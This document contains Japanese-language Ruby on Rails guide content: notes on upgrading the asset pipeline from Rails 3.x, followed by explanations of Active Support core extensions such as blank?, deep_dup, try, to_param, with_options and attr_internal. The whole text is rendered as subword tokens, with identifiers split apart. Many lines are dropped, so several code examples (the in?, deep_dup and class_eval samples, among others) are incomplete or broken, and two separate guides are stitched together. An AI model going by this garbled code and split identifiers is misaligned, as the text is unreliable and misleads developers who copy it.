▁ Sprockets . re g is ter _ engine ▁' . b an g ', ▁B an g B an g :: T e m p la te
▁ 古 い バージョンの Rails から アップグレード する
▁Rails ▁ 3.0 や Rails ▁2 . x から の アップグレード の 際に は 、 いくつかの 作業 を行う 必要があります 。
▁最初に 、` public / ` ディレクトリ 以下の ファイルを 新しい 場所 に移動し ます 。
▁ ファイルの 種類 ご と の 正しい 置き場所 については 、[ アセット の 編 成 ]( # アセット の 編 成 ) を参照してください 。
▁続いて 、 JavaScript ファイルの 重複 を 解 消 します 。
▁ j Query は Rails ▁ 3.1 以降 における デフォルトの JavaScript ライブラリ なので 、` jquery . js ` を ` app / assets ` に 置 か なくても 自動的に 読み込まれ ます 。
▁3 番 目 に 、 多くの 環境 設定 ファイルを 正しい デフォルト オプション に 更新 します 。
▁` application . rb ` の場合 。
▁# ▁ アセット のバージョン を指定する 。 アセット をすべて 期限切れ に したい場合は この 値 を変更する 。
▁# ▁config . assets . prefix ▁= ▁" / assets " は 、 アセット の 置き場所 となる パス を変更する 際に 使用する 。
▁` development . rb ` の場合 。
▁# ▁ アセット で 読み 込 んだ 行 を 展開 する 。
▁` production . rb ` の場合 。
▁# ▁ 圧 縮 機能 を使用する には ▁config . assets . js _ compressor ▁= ▁ を使用する
▁# ▁: ug li fi er ▁config . assets . css _ compressor ▁= ▁: y u i
▁# ▁ アセット URL の ダイジェスト を生成する 。
▁( 今後 非推奨 になる 計 画 あり )
▁# ▁ 追加 の アセット を プリコンパイル する ▁( application . js 、 application . css 、 および すべての
▁# ▁ 非 J S / CSS ファイルが 追加 済み ) ▁config . assets . pre compile ▁+ = ▁% w ( ▁ search . js ▁ )
▁Rails ▁4 は Sprockets の デフォルト 設定 値を test 環境 用の ` test . rb ` に設定し なく なりました 。 従って 、` test . rb ` に Sprockets の設定 を行なう 必要があります 。
▁test 環境 における 以前の デフォルト値 は 、` config . assets . compile ▁= ▁true `、` config . assets . com pre s s ▁= ▁false `、` config . assets . debug ▁= ▁false `、` config . assets . digest ▁= ▁false ` です 。
▁ 以下 を ` Gemfile ` に 追加する必要があります 。
▁gem ▁' sass - rails ', ▁" ~ > ▁3.2 . 3 "
▁gem ▁' coffee - rails ', ▁" ~ > ▁3.2 . 1 "
▁Active ▁Support ▁ コア 拡 張 機能
▁Active ▁Support は Ruby ▁on ▁Rails の コンポーネント であり 、 Ruby 言語 の 拡 張 、 ユ ー テ ィ リ テ ィ 、 その他 横 断 的な 作業 を 担 っています 。
▁Active ▁Support は 言語 レベル で 基本 部分を 底 上 げ して 豊 か な もの に し 、 Rails アプリケーションの 開発 と Ruby ▁on ▁Rails それ 自体 の 開発 に 役 立 て る べ く 作 られ ています 。
▁* ▁ コア 拡 張 機能 について
▁* ▁ すべての 拡 張 機能を 読み込む 方法
▁* ▁ 必要な 拡 張 機能 だけ を 利用 する方法
▁* ▁Active ▁Support が提供する 拡 張 機能 一覧
▁ コア 拡 張 機能を 読み込む 方法
▁### ▁ 単 体 の Active ▁Support サポート
▁ 足 跡 を ほぼ 残 さ ないように する ため 、 Active ▁Support はデフォルトで は 何も 読み込み ません 。
▁Active ▁Support は 細 か く 分割 され 、 必要な 拡 張 機能 だけ が 読み込まれ る ようになっています 。 また 、 関連する 拡 張 機能 ( 場合によっては すべての 拡 張 機能 ) も 同時に 読み込む の に 便利な エ ン ト リ ポ イン ト もあります 。
▁従って 、 以下のような require 文 を実行し た だけで は
▁require ▁' active _ support '
▁ オブジェクトは ` blank ?` に す ら 応答 してくれ ません 。
▁この 定義 が どのように 読み込まれ る か を見てみましょう 。
▁#### ▁ 必要な 定義 だけ を 選 ぶ
▁` blank ?` メソッドを 使えるように する 最も 「 軽 量 な 」 方法は 、 その メソッドが 定義されている ファイル だけ を 選 んで 読み込む ことです 。
▁ 本ガイドで は 、 コア 拡 張 機能 として 定義されている すべての メソッド について 、 その 定義ファイル の 置き場所 も 示 して あります 。
▁たとえば ` blank ?` の場合 、 以下のような メ モ を追加して あります 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / blank . rb ` です 。
▁つまり 、 以下のように ピ ン ポ イン ト で require を実行する ことができます 。
▁require ▁' active _ support / core _ ext / object / blank '
▁Active ▁Support の 改 訂 は 注意 深 く 行 わ れ ています ので 、 ある ファイルを 選 んだ 場合 、 本当に 必要な 依 存 ファイル だけ が 同時に 読み込まれ ます ( 依 存 関係 がある場合 )。
▁#### ▁ コア 拡 張 機能を グループ 化 して 読み込む
▁ 次の 段 階 として 、` Object ` に対する すべての 拡 張 機能を 単 に 読み 込 んで みましょう 。
▁ 経験 則 として 、` S o me Class ` という クラス があれば 、` active _ support / core _ ext / some _ class ` という パス を指定する ことで 一度 に 読み 込 め ます 。
▁従って 、 ( ` blank ?` を含む ) ` Object ` に対する すべての 拡 張 機能を 読み込む 場合には 以下のように します 。
▁require ▁' active _ support / core _ ext / object '
▁#### ▁ すべての コア 拡 張 機能を 読み込む
▁ すべての コア 拡 張 機能を 単 に 読み 込 んで お き たい のであれば 、 以下のように require します 。
▁require ▁' active _ support / core _ ext '
▁#### ▁ すべての Active ▁Support を 読み込む
▁最後に 、 利用 可能な Active ▁Support をすべて 読み込み たい場合は 以下のように します 。
▁require ▁' active _ support / all '
▁ただし 、 これ を実行して も Active ▁Support 全体 が メモリ に 読み込まれ る わ け では ない ことにご注意ください 。 一 部 は ` autoload ` として 設定 され ており 、 実際に 使う まで 読み込まれ ません 。
▁### ▁Ruby ▁on ▁Rails アプリケーションで Active ▁Support を使用する
▁この オプションを true に すると 、 フレームワーク 自体 が 必要 と する まで アプリケーション は 拡 張 機能を 読み込み ません 。 また 、 読み込まれ る 拡 張 機能 の 選択 は 、 上で 解 説 した ように 、 あらゆる 粒 度 で 行われます 。
▁ すべての オブジェクト で 使用できる 拡 張 機能
▁### ▁` blank ?` と ` present ?`
▁Rails アプリケーション は 以下の 値を 空白 ( blank ) と み な します 。
▁* ▁` nil ` と ` false `
▁* ▁ 空白 文字 ▁( w h it e space ) ▁ だけで 構成 された 文字列 ▁( 以下の 注 釈 参 照 )
▁* ▁ 空 欄 の配列 と ハッシュ
▁* ▁ その他 、` empty ?` メソッド に応答する オブジェクト はすべて 空白 として 扱 わ れ ます 。
▁INFO : ▁ 文字列を 判 定 する 述 語 として 、 U n i code 対応 した 文字 クラス である ` [: space : ] ` が 使用 されています 。 そのため 、 たとえば U + 20 2 9 ▁( 段 落 区切 り 文字 ) は 空白 文字 と 判 断 されます 。
▁WARN ING : ▁ 数字 については 空白 である かどうか は 判 断 されません 。
▁ 特に 0 および 0.0 は ** 空白 ではありません ** ので ご注意ください 。
▁たとえば 、` ActionController :: H tt p A u the n tic ation :: To ke n :: Controller M e th o d s ` にある 以下の メソッド では ` blank ?` を使用して トークン が存在し ている かどうかをチェックし ています 。
▁def ▁ authenticate ( controller , ▁ & login _ pro c ed ur e )
▁ token , ▁ options ▁= ▁ token _ and _ options ( controller . request )
▁ unless ▁ token . blank ?
▁ login _ pro c ed ur e . c all ( token , ▁ options )
▁` present ?` メソッドは ` ! blank ?` メソッドと 同 等 です 。
▁以下の 例 は ` ActionDispatch :: H tt p :: Cache :: Re s p on s e ` から 引 用 しました 。
▁def ▁ set _ con d i tion al _ cache _ control !
▁ return ▁if ▁self [ " Cache - Control "] . present ?
▁` presence ` メソッドは 、` present ?` が true の場合は 自身 の レシーバ を返し 、 false の場合は ` nil ` を返します 。
▁このメソッドは 以下のような 定 番 の 用 法 において 便利です 。
▁ host ▁= ▁config [: host ] . presence ▁| | ▁' localhost '
▁### ▁` dup li c able ?
▁Ruby における 基本的な オブジェクト の一部 は s ing let on オブジェクト です 。
▁たとえば 、 プログラム の ラ イ フ サ イ ク ル が 続 く 間 、 整 数 の 1 は 常に 同じ インスタンス を参照 します 。
▁1. object _ id ▁# ▁=> ▁3
▁Ma th . co s ( 0 ). to _ i . object _ id ▁# ▁=> ▁3
▁従って 、 このような オブジェクトは ` dup ` メソッド や ` c l one ` メソッドで 複 製 する ことはできません 。
▁true . dup ▁# ▁=> ▁ Type Error : ▁c an ' t ▁ dup ▁ T r u e Class
▁ s ing let on でない 数字 にも 、 複 製 不 可能な もの があります 。
▁ 0.0 . c l one ▁# ▁=> ▁ all o cat or ▁ un de f in ed ▁for ▁F lo at
▁( 2 ** 10 2 4 ). c l one ▁# ▁=> ▁ all o cat or ▁ un de f in ed ▁for ▁B ig n um
▁Active ▁Support には 、 オブジェクトが プログラム 的に 複 製 可能 かどうかを 問 い 合わせ るため の ` dup li c able ?` メソッド があります 。
▁" foo ". dup li c able ?
▁" ". dup li c able ?
▁false . dup li c able ?
▁ デフォルトで は 、` nil `、` false `、` true ` 、 シンボル 、 数値 、 クラス 、 モジュール 、 メソッド オブジェクトを 除 く すべての オブジェクトが ` dup li c able ?` ▁# => ▁true です 。
▁WARN ING : ▁ どんな クラス でも 、` dup ` メソッドと ` c l one ` メソッドを 除 去 することで これらの メソッドを 無効 に してしまう ことができます 。 このとき 、 これらの メソッドが 実行される と 例外が発生します 。
▁ このような 状態 では 、 どんな オブジェクト についても それ が 複 製 可能 かどうかを確認 するには ` re sc u e ` を使用する 以外に 方法 はありません 。
▁` dup li c able ?` メソッドは 、 上の ハ ー ド コード された リスト に 依 存 します が 、 その 代 わ り ` re sc u e ` より ず っ と 高速 です 。
▁ 実際の ユ ー ス ケース で ハ ー ド コード された リスト で 十分 であること が わ か っている 場合には 、` dup li c able ?` を お 使い ください 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / dup li c able . rb ` です 。
▁### ▁` deep _ dup `
▁` deep _ dup ` メソッドは 、 与えられた オブジェクトの 「 デ ィ ー プ コピー 」 を返します 。
▁Ruby は 通常の 場合 、 他の オブジェクト を含む オブジェクトを ` dup ` しても 、 他の オブジェクト については 複 製 しません 。 このような コピー は 「 浅 い コピー ▁( sh allow ▁ co p y )」 と 呼ばれ ます 。
▁たとえば 、 以下のように 文字列 を含む 配列 が あるとします 。
▁ array ▁= ▁ [' string ']
▁ dup li cat e ▁= ▁ array . dup
▁ dup li cat e . push ▁' an other - string '
▁# ▁この オブジェクトは 複 製 された ので 、 複 製 された 方 に だけ 要素 が追加され た
▁ array ▁# ▁=> ▁ [' string ']
▁ dup li cat e ▁# ▁=> ▁ [' string ', ▁' an other - string ']
▁ string ', ▁' foo ')
▁# ▁1 つ目の 要素 は 複 製 されていない ので 、 一方 を変更する と どちら の配列 も 変更 される
▁ array ▁# ▁=> ▁ [' foo ']
▁ dup li cat e ▁# ▁=> ▁ [' foo ', ▁' an other - string ']
▁ 上で 見 た とおり 、` Array ` の インスタンス を 複 製 して 別の オブジェクトが できた ことにより 、 一方 を変更 しても 他 方は 変更 され ない ようになりました 。
▁ただし 、 配列 は 複 製 されました が 、 配列 の 要素 は そう ではありません 。
▁` dup ` メソッドは デ ィ ー プ コピー を 行 わ ないので 、 配列 の中に ある 文字列 は 複 製 後 も 同 一 オブジェクトの ま ま です 。
▁ オブジェクトを デ ィ ー プ コピー する 必要がある 場合は ` deep _ dup ` を お 使い ください 。
▁ 例 :
▁ dup li cat e ▁= ▁ array . deep _ dup
▁ dup li cat e ▁# ▁=> ▁ [' foo ']
▁ オブジェクトが 複 製 不 可能な 場合 、` deep _ dup ` は 単 に そのオブジェクト を返します 。
▁ number ▁= ▁1
▁ dup li cat e ▁= ▁ number . deep _ dup
▁ number . object _ id ▁= = ▁ dup li cat e . object _ id ▁# ▁=> ▁true
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / deep _ dup . rb ` です 。
▁### ▁` t ry `
▁` nil ` でない 場合に のみ オブジェクトの メソッドを 呼び出し たい 場合 、 最も 単純な 方法は 条件 文 を追加する ことです が 、 ど こ か 冗 長 になってしまい ます 。
▁ そこで ` t ry ` メソッド を使う という 手 があります 。 ` t ry ` は ` Object # s end ` と似ています が 、` nil ` に 送信された 場合には ` nil ` を返す 点が 異なります 。
▁# ▁t ry メソッド を使用し ない場合
▁ unless ▁@ number . nil ?
▁@ number . n ext
▁# ▁t ry メソッド を使用した 場合
▁@ number . t ry (: n ext )
▁` ActiveRecord :: Connection A d a p ter s :: A b s tr a ct A d a p ter ` から 別の 例 として 以下 を ご 紹 介 します 。 ここでは `@ logger ` が ` nil ` になる ことがあります 。
▁ このコード では ` t ry ` を使用した ことで 余 分 な チェック を 行 わ ずに 済 んで います 。
▁def ▁ log _ info ( sql , ▁name , ▁ m s )
▁if ▁@ logger . t ry (: debug ? )
▁name ▁= ▁' % s ▁( % . 1 f m s ) ' ▁% ▁[ name ▁| | ▁' SQL ', ▁ m s ]
▁@ logger . debug ( format _ log _ ent ry ( name , ▁ sql . s que e z e (' ▁ ') ) )
▁` t ry ` メソッドは 引数 の 代りに ブロック を与えて 呼 び 出 す こともできます 。 この場合 オブジェクトが ` nil ` でない 場合に のみ ブロック が 実行されます 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / t ry . rb ` です 。
▁### ▁` class _ eval ( * ar g s , ▁ & block ) `
▁` class _ eval ` メソッド を使用することで 、 あらゆる オブジェクトの s ing let on クラスの コンテキスト で コードを 評価 することができます 。
▁class ▁ Proc
▁def ▁ bin d ( object )
▁ block , ▁ time ▁= ▁self , ▁ Time . current
▁ object . class _ eval ▁do
▁ method _ name ▁= ▁" _ _ bin d _ # { time . to _ i } _ # { time . u sec } "
▁def in e _ method ( method _ name , ▁ & block )
▁ method ▁= ▁ instance _ method ( method _ name )
▁ remove _ method ( method _ name )
▁ method
▁end . bin d ( object )
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / k er n e l / s ing let on _ class . rb ` です 。
▁### ▁` a ct s _ li ke ? (
▁` a ct s _ li ke ?` メソッドは 、 一部の クラス が その他 の クラス と同様に 振 る 舞 う かどうか の チェック を 、 ある 慣 例 に 則 って 実行 します 。 ` String ` クラス と同じ インターフェイス を 提 供 する クラス があり 、 そ の中で 以下の メソッドを 定義 しておく とします 。
▁def ▁a ct s _ li ke _ string ?
▁このメソッドは 単なる 目 印 であり 、 メソッドの 本 体 と 戻り値 の間に は 関連 はありません 。
▁これにより 、 クライアント コード で 以下のような ダ ッ ク タ イ ピ ング チェック を行なう ことができます 。
▁ some _ k la s s . a ct s _ li ke ? (: string )
▁Rails には ` Date ` クラス や ` Time ` クラス と同様に 振 る 舞 う クラス が いくつか あり 、 この 手法 を使用できます 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / a ct s _ li ke . rb ` です 。
▁### ▁` to _ param `
▁Rails の あらゆる オブジェクトは ` to _ param ` メソッド に 応答 します 。 これは 、 オブジェクトを 値 として 表現 する もの を返す ということです 。 返 された 値 は クエリ 文字列 や URL の一部 で 使用できます 。
▁ デフォルトで は 、` to _ param ` メソッドは 単 に ` to _ s ` メソッド を呼び出します 。
▁ 7 . to _ param ▁# ▁=> ▁" 7 "
▁` to _ param ` によって 返 された 値を ▁** エスケープ して は い け ません ** ▁ 。 脆弱性 が生じ ます 。
▁" To m ▁ & ▁ J er ry ". to _ param ▁# ▁=> ▁" To m ▁ & ▁ J er ry "
▁このメソッドは 、 Rails の 多くの クラス で 上 書き されています 。
▁たとえば 、` nil `、` true `、` false ` の場合は 自分自身 を返します 。
▁` Array # to _ param ` を実行すると 、` to _ param ` が 配列 内の 各 要素 に対して 実行 され 、 結果 が " / " で join されます 。
▁[ 0, ▁true , ▁ String ] . to _ param ▁# ▁=> ▁" 0 / true / String "
▁ 特に 、 Rails の ルーティング システム は モデル に対して ` to _ param ` メソッド を実行する ことで 、`: id ` プ レ ー ス ホ ル ダ の値 を取得し ています 。
▁` ActiveRecord :: Base # to _ param ` は モデルの ` id ` を返します が 、 このメソッド を モデル 内で 再 定義 することもできます 。
▁class ▁User
▁def ▁to _ param
▁" # { id } - # { name . param e ter ize } "
▁以下の 結果を 得 ます 。
▁ user _ path (@ user ) ▁# ▁=> ▁" / users / 3 5 7 - j o h n - s m i th "
▁WARN ING : ▁ コントローラ 側 では 、` to _ param ` メソッドが モデル 側 で 再 定義されている 可能性 がある ことに 常に 注意 しておく必要があります 。 上 のような リクエストを 受信 した 場合 、` params [: id ] ` の 値が " 3 5 7 - j o h n - s m i th " になる からです 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / to _ param . rb ` です 。
▁### ▁` to _ query `
▁このメソッドは 、 エスケープ されていない ` key ` を 受け 取 ると 、 その キー を ` to _ param ` が 返す 値 に 対応 させる クエリ 文字列 の一部 を生成します 。 ただし ハッシュ は 例外 です ( 後 述 )。
▁たとえば 以下の 場合 、
▁このメソッドは 、 キー と 値 の いずれ についても 、 必要な 箇所 をすべて エスケープ します 。
▁ account . to _ query (' com p any [ name ] ')
▁# ▁=> ▁" com p any % 5 B name % 5 D = John s on + % 2 6 + John s on "
▁従って 、 この 結果 は そのまま クエリ 文字列 として 使用できます 。
▁ 配列 に ` to _ query ` メソッドを 適 用 した 場合 、` to _ query ` を 配列 の 各 要素 に適用 して ` _ key _ [ ] ` を キー として 追加 し 、 それら を " & " で 連 結 した もの を返します 。
▁[ 3 . 4 , ▁- 4 5 . 6 ] . to _ query (' sample ')
▁# ▁=> ▁" sample % 5 B % 5 D = 3 . 4 & sample % 5 B % 5 D = - 4 5 . 6 "
▁ ハッシュ も ` to _ query ` に 応答 します が 、 異なる シ グ ネ チ ャ を使用します 。
▁ メソッド に 引数 が 渡 され ない場合 、 このメソッド 呼び出し は 、 一 連 の キー / 値 ペ ア を ソ ート 済み の 形 で 生成 し 、 それぞれの 値 に対して ` to _ query ( key ) ` を呼び出します 。
▁続いて 結果を " & " で 連 結 します 。
▁ { c : ▁ 3, ▁ b : ▁ 2, ▁a : ▁1 } . to _ query ▁# ▁=> ▁" a = 1 & b = 2 & c = 3 "
▁` Hash # to _ query ` メソッドは 、 それらの キー に対して 名前空間 を オプション で 与え る こともできます 。
▁ { id : ▁ 8 9 , ▁name : ▁" John ▁S m i th "} . to _ query (' user ')
▁# ▁=> ▁" user % 5 B id % 5 D = 8 9 & user % 5 B name % 5 D = John + S m i th "
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / to _ query . rb ` です 。
▁### ▁` with _ options `
▁` with _ options ` メソッドは 、 連 続 した 複数の メソッド 呼び出し に対して 共通 して 与え られ る オプションを 解 釈 するための 手 段 を提供します 。
▁ デフォルトの オプション が ハッシュ で 与え られ ると 、` with _ options ` は ブロック に対する プロキシ オブジェクト を生成します 。
▁その ブロック 内で は 、 プロキシ に対して 呼び出され た メソッド に オプション を追加した う え で 、 その メソッドを レシーバ に 転 送 します 。
▁たとえば 、 以下のように 同じ オプションを 繰 り 返 さ ない で 済 む ようになります 。
▁has _ many ▁: customer s , ▁ dependent : ▁: destroy
▁has _ many ▁: products , ▁ dependent : ▁: destroy
▁has _ many ▁: in v o i ce s , ▁ dependent : ▁: destroy
▁has _ many ▁: ex p en s es , ▁ dependent : ▁: destroy
▁ 上 は 以下のように できます 。
▁with _ options ▁ dependent : ▁: destroy ▁do ▁| as s o c |
▁as s o c . has _ many ▁: customer s
▁as s o c . has _ many ▁: products
▁as s o c . has _ many ▁: in v o i ce s
▁as s o c . has _ many ▁: ex p en s es
▁この 手法 を使用することで 、 たとえば ニ ュ ー ス レ ター の 読者 を 言語 ごとに ▁ _ グループ 化 _ ▁ することができます 。
▁ 読者 が 話 す 言語 に応じて 異なる ニ ュ ー ス レ ター を送信し たい とします 。
▁ メ イ ル 送信 用の コードの ど こ か で 、 以下のような感じ で ロケール 依 存 ビ ッ ト を グループ 化 することができます 。
▁I 18 n . with _ options ▁ local e : ▁ user . local e , ▁ scope : ▁" new s let ter " ▁do ▁| i 18 n |
▁ subject ▁ i 18 n . t ▁: subject
▁ body ▁ i 18 n . t ▁: body , ▁ user _ name : ▁ user . name
▁ TIP : ▁` with _ options ` は メソッドを レシーバ に 転 送 している ので 、 呼び出し を ネスト することもできます 。
▁ 各 ネ ス テ ィ ング レベル では 、 自身 の 呼び出し に 、 継 承 した デフォルト 呼び出し を マージ します 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / with _ options . rb ` です 。
▁### ▁ JSON ▁ support
▁Active ▁Support が提供する ` to _ json ` メソッド の実装 は 、 通常 ` json ` ▁gem が Ruby オブジェクト に対して 提供し ている ` to _ json ` よりも 優 れ ています 。
▁その 理由 は 、` Hash ` や ` Order ed Hash `、` Proc ess :: S t at us ` などの クラス では 、 正しい JSON 表現 を 提 供 するために 特別な 処理 が 必要 になる ためです 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / json . rb ` です 。
▁### ▁ インスタンス変数
▁Active ▁Support は 、 インスタンス変数 に 簡単に アクセス するための メソッドを 多 数 提供し ています 。
▁#### ▁` instance _ value s `
▁` instance _ value s ` メソッドは ハッシュ を返します 。 インスタンス変数 名 から " @ " を 除 いた もの が ハッシュの キー に 、 インスタンス変数 の 値が ハッシュ の値 に マ ッ プ されます 。
▁ キー は 文字列 です 。
▁class ▁C
▁def ▁ initialize ( x , ▁ y )
▁@ x , ▁@ y ▁= ▁ x , ▁ y
▁C . new ( 0, ▁1 ). instance _ value s ▁# ▁=> ▁ { " x " ▁=> ▁ 0, ▁" y " ▁=> ▁1 }
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / instance _ variable s . rb ` です 。
▁#### ▁` instance _ variable _ name s `
▁` instance _ variable _ name s ` メソッドは 配列 を返します 。
▁ 配列 の インスタンス 名 には " @ " 記 号 が含まれ ます 。
▁C . new ( 0, ▁1 ). instance _ variable _ name s ▁# ▁=> ▁[" @ x ", ▁" @ y "]
▁` s il en ce _ w ar n ing s ` メソッドと ` en able _ w ar n ing s ` メソッドは 、 ブロック が 継 続 する 間 ` $ V ERB OS E ` の値 を変更 し 、 その後 リセット します 。
▁ s il en ce _ w ar n ing s ▁ { ▁ Object . const _ set ▁" R A I L S _ D E F A U L T _ L O G G ER ", ▁ logger ▁ }
▁` s up pre s s ` メソッドを使用すると 例外 の 発生 を 止 め る こともできます 。
▁このメソッドは 、 例外 クラス を表す 任意の 数値 を受け取り ます 。
▁` s up pre s s ` は 、 ある ブロック の 実行 時に 例外 が発生し 、 その 例外 が ( ` k in d _ of ?` による 判 定 で ) いずれ か の 引数に 一致する 場合 、 それ を キ ャ プ チ ャ して 例外を発生 せずに 戻 ります 。
▁ 一 致 し ない場合 、 例外 は キ ャ プ チ ャ されません 。
▁# ▁ ユーザーが ロ ッ ク され ていれば イン ク リ メ ン ト は 失 わ れる が 、 重要 では ない
▁ s up pre s s ( ActiveRecord :: S t al e Object Error ) ▁do
▁ current _ user . in c re m ent ! ▁: v is it s
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / k er n e l / re port ing . rb ` です 。
▁### ▁` in ?
▁ 述 語 ` in ?` は 、 ある オブジェクトが 他の オブジェクト に 含 まれ ている かどうか をテストします 。
▁ 渡 された 引数 が ` include ?` に 応答 し ない場合は ` A r g um ent Error ` 例外が発生します 。
▁` in ?` の例 を示します 。
▁1, 2 ] ) ▁# ▁=> ▁true
▁ hello ") ▁# ▁=> ▁true
▁ 30 . . 50 ) ▁# ▁=> ▁false
▁1 ) ▁# ▁=> ▁A r g um ent Error
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / i nclusion . rb ` です 。
▁` M o d ul e ` の 拡 張
▁### ▁` a li as _ method _ cha in `
▁ 拡 張 されていない 純 粋 な Ruby を使用して 、 メソッドを 他の メソッドで 包 み 込 む ( w r a p ) ことができます 。 これは ▁ _ エイリアス チ ェ ー ン ▁( a li as ▁ cha in ing ) _ ▁ と 呼ばれ ています 。
▁たとえば 、 機能 テスト のとき には パラメータ が ▁( 実際の リクエスト のとき と同様に ) ▁ 文字列 で あって 欲 しい とします 。 しかし 必要な ときに は 整 数 など 他の 型 の値 を持つ ことも できるように しておき たい とします 。
▁ これを 実現 するには 、` ActionController :: Test C as e # process ` を 以下のように ` test / test _ helper . rb ` で ラ ッ プ します 。
▁ ActionController :: Test C as e . class _ eval ▁do
▁# ▁ 元の プロセス メソッド への 参 照 を 保存
▁a li as _ method ▁: origin al _ process , ▁: process
▁def ▁ process ( action , ▁ params = nil , ▁ session = nil , ▁ flash = nil , ▁ http _ method =' GET ')
▁ params ▁= ▁ Hash [ * params . ma p ▁ { | k , ▁ v | ▁[ k , ▁ v . to _ s ]} . f la tt en ]
▁ origin al _ process ( action , ▁ params , ▁ session , ▁ flash , ▁ http _ method )
▁これは 、` get `、` post ` メソッド など が 作業 を 委 譲 するときに 使われ る 手法 です 。
▁この 手法 には 、`: origin al _ process ` が 取得 される 可能性 がある という リ ス ク があります 。
▁ エイリアス チ ェ ー ン が行われ る 対象 を 特 徴 付け る ラ ベ ル が 選 ば れる ときに そのような 衝 突 を 回 避 するには 、 次のように します 。
▁def ▁ process _ with _ string ified _ params (...)
▁ process _ with out _ string ified _ params ( action , ▁ params , ▁ session , ▁ flash , ▁ http _ method )
▁a li as _ method ▁: process _ with out _ string ified _ params , ▁: process
▁a li as _ method ▁: process , ▁: process _ with _ string ified _ params
▁` a li as _ method _ cha in ` メソッドを使用すると 、 上 のような パターン を簡単に 行 え ます 。
▁a li as _ method _ cha in ▁: process , ▁: string ified _ params
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / a li as ing . rb ` です 。
▁### ▁ 属性
▁#### ▁` a li as _ attribute `
▁ モデルの 属性 には 、 リ ー ダ ー ▁( reader ) 、 ラ イ ター ▁( write r ) 、 述 語 ▁( pre d i cat e ) ▁ があります 。
▁ 上 に対応する 3 つの メソッド を持つ 、 モデルの 属性 の別名 ▁( a li as ) ▁ を 一度 に 作成 することができます 。
▁ 他 の別名 作成 メソッド と同様 、 1 つ目の 引数に は 新しい 名前 、 2 つ目の 引数に は 元の 名前 を指定します ▁( 変数 に 代入 する とき と同じ 順序 、 と 覚 え ておく 手 もあります )。
▁# ▁ email カラム を " login " という 名前 でも 参 照 したい
▁# ▁ そう することで 認 証 のコード が わかりやすく な る
▁#### ▁ 内部 属性
▁ ある クラス で 属性 を定義する と 、 後に その クラスの サブ クラス が 作成される ときに 名前 が 衝 突 する リ ス ク が生じ ます 。
▁これは ライブラリ において は 特に 重要な 問題 です 。
▁Active ▁Support では 、` attr _ internal _ reader `、` attr _ internal _ write r `、` attr _ internal _ accessor ` という マクロ が 定義 されています 。
▁これらの マクロ は 、 Ruby に ビルトイン されている ` attr _ * ` と同様に 振る舞い ます が 、 内部 の インスタンス変数 の名前 が 衝 突 し にくい ように 配 慮 される 点が 異なります 。
▁` attr _ internal ` マクロ は ` attr _ internal _ accessor ` と 同 義 です 。
▁# ▁ ライブラリ
▁class ▁ T h ir d P ar t y L i br ary :: C raw l er
▁ attr _ internal ▁: log _ le ve l
▁# ▁ クライアント コード
▁class ▁ M y C raw l er ▁< ▁ T h ir d P ar t y L i br ary :: C raw l er
▁ attr _ accessor ▁: log _ le ve l
▁ 先 の例 では 、`: log _ le ve l ` は ライブラリ の パ ブ リ ッ ク インターフェイス に 属 さ ず 、 開発 用 途 に のみ 使用されます 。
▁ クライアント 側 のコード では 衝 突 の 可能性 について 考 慮 せずに 独 自 に `: log _ le ve l ` を サブ クラス で 定義 しています 。
▁このとき 、 内部 インスタンス変数 の名前 に はデフォルトで 冒 頭 に アンダースコア が追加され ます 。 上の 例 であれば `@ _ log _ le ve l ` となります 。
▁この 動作 は ` M o d ul e . attr _ internal _ n am ing _ format ` を使用して 変更 することもできます 。 ` s p r in t f ` と同様 の フォーマット 文字列を 与え 、 冒 頭 に `@ ` を 置 き 、 それ以外の 名前 を 置 き たい 場所 に ` % s ` を 置 きます 。
▁ デフォルト値 は ` " @ _ % s " ` です 。
▁Rails では この 内部 属性を 他の 場所 でも 若 干 使用 しています 。 たとえば ビュー では 以下のように 使用 しています 。
▁ module ▁ ActionView
▁class ▁ Base
▁ attr _ internal ▁: ca p t ur es
▁ attr _ internal ▁: request , ▁: layout
▁ attr _ internal ▁: controller , ▁: template
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / attr _ internal . rb ` です 。
▁#### ▁ モジュール 属性
▁` m attr _ reader `、` m attr _ write r `、` m attr _ accessor ` という 3 つの マクロ は 、 クラス 用 に 定義 される ` c attr _ * ` マクロ と同じ です 。
▁ 実際 、` c attr _ * ` マクロ は 単なる ` m attr _ * ` マクロ の別名 です 。
▁[ クラス 属性 ]( # class 属性 ) も 参 照 してください 。
▁たとえば 、 これらの マクロ は 以下の D e p end en c ies モジュール で使用されていま す 。
▁ module ▁ ActiveSupport
▁ module ▁D e p end en c ies
▁ m attr _ accessor ▁: w ar n ing s _ on _ first _ load
▁ m attr _ accessor ▁: h ist or y
▁ m attr _ accessor ▁: load ed
▁ m attr _ accessor ▁: me cha n is m
▁ m attr _ accessor ▁: load _ path s
▁ m attr _ accessor ▁: load _ on ce _ path s
▁ m attr _ accessor ▁: autoload ed _ const an t s
▁ m attr _ accessor ▁: ex p li c it ly _ un load able _ const an t s
▁ m attr _ accessor ▁: logger
▁ m attr _ accessor ▁: log _ a ct i v ity
▁ m attr _ accessor ▁: const an t _ w at ch _ st ack
▁ m attr _ accessor ▁: const an t _ w at ch _ st ack _ m u t ex
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / attribute _ accessor s . rb ` です 。
▁### ▁ 親
▁#### ▁` parent `
▁` parent ` メソッドは 、 名前 が ネスト した モジュール に対して 実行 でき 、 対応する 定数 を持つ モジュール を返します 。
▁ module ▁X
▁ module ▁ Y
▁ module ▁ Z
▁ M ▁= ▁X :: Y :: Z
